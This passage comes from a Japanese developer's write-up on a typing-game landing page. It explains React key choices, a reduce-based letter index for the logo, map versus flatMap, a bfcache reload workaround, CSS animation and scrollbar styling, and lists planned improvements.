- コンポーネントの state（アニメーション状態など）が意図しない要素に引き継がれる

```
// 先頭に id=4 のニュースを追加した場合

// 追加前
key=0 → id=1「お知らせA」
key=1 → id=2「お知らせB」
key=2 → id=3「お知らせC」

// 追加後（本来）
key=0 → id=4「お知らせD」 ← 新規
key=1 → id=1「お知らせA」
key=2 → id=2「お知らせB」
key=3 → id=3「お知らせC」

// React の認識（key ベースで比較）
key=0 は前もあった → 変わっていないと判断 → id=1 の内容のまま表示
key=3 が新しい    → 新規追加と判断 → id=3「お知らせC」をレンダリング
                                    （本来は id=4「お知らせD」が来るべき）
// 結果：id=4 を追加したはずが、画面上は id=1 の内容が key=0 に居座り続ける

// 表示されるのは1,1,2,3(お知らせDがない！)
```

#### 解決：ビジネス的に一意な id を key にする

```tsx
// News.tsx
type NewsItem = {
  id: number; // ← ビジネス的に一意な識別子
  date: string;
  tag: string;
  text: string;
};

const NEWS_ITEMS: NewsItem[] = [
  { id: 3, date: "2026.03.17", tag: "feat", text: "..." },
  { id: 2, date: "2026.02.03", tag: "fix", text: "..." },
  { id: 1, date: "2026.01.27", tag: "Release", text: "..." },
];

// ✅ 正しい
NEWS_ITEMS.map((item) => <li key={item.id}>...</li>);
```

`id` はデータが持つ**意味のある識別子**なので、並び順が変わっても key とデータが常に一致する。

#### FAQ のケース

FAQ は `id` を削除し、`question` を `key` にしている。
`question` は一意であるため識別子として十分機能する。
わざわざ `id` を付与・管理しなくても、`question` の一意性で十分識別できるという判断。

```tsx
// FaqInfo.tsx
faqs.map((faq) => (
  <AccordionItem key={faq.question} ... />
))
```
Newsもtext管理でidいらないんじゃねと思いますが、例えばtextを、不具合を修正しましたを連続投稿すると片方が消えるのと、更にどちらが消えるのか保証されないという地獄が待ってます。なのでidが現状の選択肢として正解と判断しました。

---

### LOGO_WORD — reduce による文字 index オフセット計算

#### 目的

ロゴ "CRITICAL TYPING" の各文字には、**全文字を通した連番インデックス**でスタイルを当てたい。
単語内の `i` ではなく、"C"=0, "R"=1 ... "T"=8, "Y"=9 ... という通し番号が必要。

#### 実装

```tsx
// Header.tsx
const LOGO_WORD = ["CRITICAL", "TYPING"] as const;

LOGO_WORD.map((word, wordIndex) => {
  // slice(0, wordIndex) = 今の単語より前にある単語たちを取得
  // reduce で各単語の文字数を合計 → 前の単語の文字数の累積 = オフセット
  const offset = LOGO_WORD.slice(0, wordIndex).reduce(
    (sum, w) => sum + w.length,
    0, // ← 初期値
  );

  return word.split("").map((char, i) => (
    <GamingKey key={`${word}-${i}`} char={char} index={offset + i} />
    //                                                  ^ 通し番号
  ));
});
```

| wordIndex      | LOGO_WORD.slice(0, wordIndex) | reduce 結果 (offset) |
| :------------- | :---------------------------- | :------------------- |
| 0 ("CRITICAL") | []                            | 0                    |
| 1 ("TYPING")   | ["CRITICAL"]                  | 8                    |

"TYPING" の先頭文字 "T" には `index = 8 + 0 = 8` が渡される。

#### なぜ flatMap にしなかったか

レンダリング構造として「単語ごとに `<div>` でラップする」必要がある。
`flatMap` にすると文字が1次元に展開されてしまい、単語ごとの `<div>` が作れなくなる。

```
map を使った場合の構造（採用）
<div> C R I T I C A L </div>   ← CRITICAL の div
<div> T Y P I N G </div>       ← TYPING の div

flatMap にした場合
C R I T I C A L T Y P I N G   ← 単語の区切りが消える
```

**DOM の構造は二次元（単語ごとの div）を保ちつつ、GamingKey に渡す index だけは全文字通しの一次元連番**にする、という設計。

#### メリット

`LOGO_WORD` 配列の内容を変えるだけで offset が自動計算される。
ハードコードで各文字に番号を振る必要がなく、**保守性が高い**。

```tsx
// GamingKey — index でスタイルを循環適用
const style = twilightStyles[index % twilightStyles.length];
```

通し番号を `% 3` で循環させることで、**単語をまたいで色が連続する**。
単語内の `i` をそのまま使うと "CRITICAL" と "TYPING" でそれぞれ 0 から始まるため、
先頭文字が必ず同じ色になってしまう。

> 現状は3色のため循環パターンが短く、恩恵は限定的。
> 色数を増やすほど単語をまたいだグラデーション感が出る設計になっている。

```
// 単語内 i を使った場合（NG）
C(0) R(1) I(2) T(0) I(1) C(2) A(0) L(1)   ← CRITICAL
T(0) Y(1) P(2) I(0) N(1) G(2)             ← TYPING の T がまた 0 に戻る

// 通し番号を使った場合（採用）
C(0) R(1) I(2) T(3) I(4) C(5) A(6) L(7)
T(8) Y(9) P(10) I(11) N(12) G(13)         ← 単語をまたいで色が連続する
```

キーボードのカラーバリエーションが単語の境目で途切れず、自然なグラデーションに見える。

#### キーボード対応表（flatMap を使う側）との対比

```tsx
// KeyCap の並び — 行の構造は不要、1次元に並べたい → flatMap
rows.flatMap((row, i) =>
  row.chars.map((char, j) => <KeyCap key={`${i}-${j}`} ... />)
)
```

ロゴは「単語ごとの div が必要 → map」、キーボード対応表は「行構造不要、1次元に並べたい → flatMap」。
**同じネスト構造でも目的によって使い分けている**のがポイント。

`flatMap` が成立するのは **CSS Grid が折り返しを担当できるとき**。
`grid-cols-5` に渡す配列はフラットでよく、React は「ただ並べるだけ」で済む。

```
// flatMap で1次元に渡す
[あ, い, う, え, お, か, き, く, け, こ]

// grid-cols-5 が自動で折り返す
あ い う え お
か き く け こ
```

逆に**行ごとに文字数が違う場合は CSS Grid で表現できないため map のネストが必要**。

```
// ロゴ — "CRITICAL"(8文字) と "TYPING"(6文字) で列数が異なる
// → 行ごとに <div> で囲む必要がある → map ネスト
CRITICAL  ← 8文字
TYPING    ← 6文字
```

---

### bfcache 対応 — pageshow イベントによる回避

#### bfcache（Back/Forward Cache）とは

ブラウザが「戻る / 進む」操作を高速化するために、ページを**メモリにフリーズ保存**する機能。
Safari で特に積極的に使われる。

bfcache から復元されたページは：

- `load` イベントが発火しない
- React の state がフリーズしたまま復元される

#### 問題

ハンバーガーメニューが `isOpen = true` の状態でフリーズ保存されると、
「戻る」操作で**メニューが開いたまま復元**される。
さらに CSS transition が「開→閉」のアニメーションを実行しないため挙動がおかしくなる。

内部リンクはこの現象が起きないが、外部リンクに飛んで戻るを押した時にこの現象が起きてしまう

```
isOpen(true)で保存されてしまったときの挙動例
  →メニューを開いたまま外部リンクへ移動（ゲームのURL）
    →bfcacheが発動し、isOpen(true)のまま凍結される。
    （メニューを開いたまま外部リンクへ飛んだため）
      →ゲームから戻るボタンを押す
        →ナビゲーションボタンを再度押す
          →animation発動後にドロワーが視覚的に消えるが DOM には残っており、
          見えない状態でクリックが通ってしまう（ゴースト状態）
```
ハンバーガーメニューはスマホ向けの UI だが、ゲーム自体は PC 専用のため実害は少ない。
それでも UX 上はバグとして見られてしまうため対応した。

#### 対応

```tsx
// Header.tsx
useEffect(() => {
  const handlePageShow = (e: PageTransitionEvent) => {
    if (e.persisted) {
      // e.persisted = true のとき bfcache から復元された
      location.reload();
    }
  };

  window.addEventListener("pageshow", handlePageShow);
  return () => window.removeEventListener("pageshow", handlePageShow);
}, []);
```

`pageshow` イベントは `load` と違い **bfcache 復元時にも発火する**。
`e.persisted` が `true` のとき bfcache からの復元なので、強制リロードで state をリセットする。

#### 「解決」ではない点

この対応は「bfcache 復元後に強制リロードする」というもので、
**bfcache のパフォーマンスメリット（瞬時復元）を捨てている**。
本質的な解決は「復元しても壊れない state 設計」だが、
理論上は `pageshow` で `isOpen` を `false` にリセットする方法があるものの、
bfcache のライフサイクルを正確にハンドリングする必要があり現状未解決。

`location.reload` はメモリ上のデータや状態を破棄し、ゼロからコンテンツを読み込み直す。
そのため bfcache のパフォーマンスメリット（瞬時復元）を捨てることになるが、
現状は **「壊れた UX を出さない」** ための最低限の回避策として採用している。

---

## 4. こだわりのデザイン

### CSS アニメーション設計

#### ハンバーガーメニュー

```tsx
// Header.tsx — 3本線を X に変形する純粋 CSS アニメーション
<span className={`... ${isOpen ? "top-1/2 -translate-y-1/2 rotate-315" : "top-1"}`} />
<span className={`... ${isOpen ? "opacity-0 -translate-x-2.5" : "opacity-100"}`} />
<span className={`... ${isOpen ? "bottom-1/2 translate-y-1/2 -rotate-315" : "bottom-1"}`} />
```

3本の `<span>` に `transition-all duration-300` を当て、
`isOpen` フラグで Tailwind クラスを切り替えるだけで X ↔ ハンバーガーのトグルアニメーションを実現。
JS でアニメーションを制御していないため軽量。
rotate を 45 ではなく 315 にすることで回転方向を逆にし、
中央の線を `translateX` で 10px ずらすことで X の交差がきれいに見えるよう調整している。

#### ボタン（GameButton）

```tsx
// components/common/GameButton.tsx
className="... hover:scale-105 active:scale-95 transition-transform"
style={{
  boxShadow: "inset 0 3px 5px rgba(255,255,255,0.9), inset 0 11px 16px rgba(255,255,255,0.4), inset 0 -4px 9px rgba(0,0,0,0.15)",
}}
```

- `hover:scale-105` — ホバーで少し拡大、押せる感を演出
- `active:scale-95` — クリック時に縮小、物理的に押し込む感触
- `inset box-shadow` — 上部に光・下部に影を内側から当てることで、物理的な厚みを感じるぷっくりとした立体感を演出

#### スクロールバー

```css
/* globals.css — スマホはデフォルト非表示 */
::-webkit-scrollbar {
  display: none;
}
* {
  scrollbar-width: none;
} /* Firefox */

/* PC (1024px以上) だけカスタム表示 */
@media (width >= 1024px) {
  ::-webkit-scrollbar-track {
    background-color: #020617;
  }
  ::-webkit-scrollbar-thumb {
    background: linear-gradient(180deg, #fcd34d 0%, #d97706 100%);
    border-radius: 99px;
    border: 3px solid #020617; /* トラックと同色の border でつまみを細く見せる */
    background-clip: content-box;
  }
}
```

`border: 3px solid #020617` + `background-clip: content-box` のテクニックで、
**実際のサイズを変えずに見た目だけ細いつまみ**にしている。

テーマカラー（`.theme-blue` / `.theme-red`）はクラスの付け替えだけで対応。
CSS カスケードにより、ページ固有クラスがデフォルトスタイルを上書きする。

## 5. 今後の改善

## P0: 今すぐ直すべき項目
- `components/features/Hero.tsx` の未使用 import を削除し、lint warning をゼロにする。
- `app/terms/TermsOfSerVice.tsx` の命名ゆれを解消する。
- `app/privacy/PrivacyPolicy.tsx` / `app/terms/TermsOfSerVice.tsx` の TODO コメント（共通化）を実施する。
- bfcache 問題の根本解決（`location.reload` の回避策からの脱却）
- ファーストビューに全ボタンが収まるようレイアウト調整
- 全体的なレイアウト見直し

## P1: 保守性・品質を上げる項目
- `package.json` に品質確認コマンドを整理する。
  - `lint`
  - `build`
  - `test` または最低限のチェック用スクリプト
-  GitHub / Vercel デプロイ前に実行する確認項目を固定化する。
  - Lighthouse 計測条件を記録する
  - Desktop / Mobile の記録を分ける
  - 3回平均を残す
- `ContactLoading.tsx` のスタイル責務を分割し、レビューしやすくする。
- `Hero.tsx` のセクション責務を整理し、将来の改修で分割しやすくする。
- `Header.tsx` 内の `GamingKey` / `HeaderBtn` / `DrawerBtn` をファイル外に切り出すか `memo` 化し、毎レンダーでの再生成を防ぐ。
- `GamingKey` 内の `twilightStyles` 配列をコンポーネント外で定義し、レンダー毎の再生成を防ぐ。

## P2: 実務っぽさを強める項目
- 異常系UXを各画面で統一する。
  - 外部URL未設定時の表示方法を `alert` 以外にする
  - エラーメッセージの見た目を共通化する
- 命名ルールを決める。
  - コンポーネント: PascalCase
  - hooks: `useXxx`
  - utility: camelCase
  - FAQ / Terms など表記ゆれの統一
  - イベントハンドラを `handleXxx` に統一（例: `toggleMenu` → `handleMenuToggle`）  
-  監視方針を整理する。
  -  ゲーム側の Sentry 設定内容をドキュメント化
  -  LP 側へ適用する最小設定（DSN / release / environment）を定義
  -  アラート対応フロー（初動・切り分け・復旧）をメモ化
- 最低限のテストを追加する。
  - `generateStars` のユニットテスト（Vitest）
  - `romaTable` のデータ構造検証
  - Zod スキーマのバリデーション
  - ページ表示・導線確認の E2E テスト（Playwright）

## P3: 余裕があればやる項目
- `next/font/google` 依存の扱いを見直し、ネットワーク不安定時でも build しやすくする。
- アニメーション量の最適化や reduced motion 対応を検討する。
- セキュリティヘッダや CSP の導入可否を検討する。
- AWS 移行の設計方針を決める

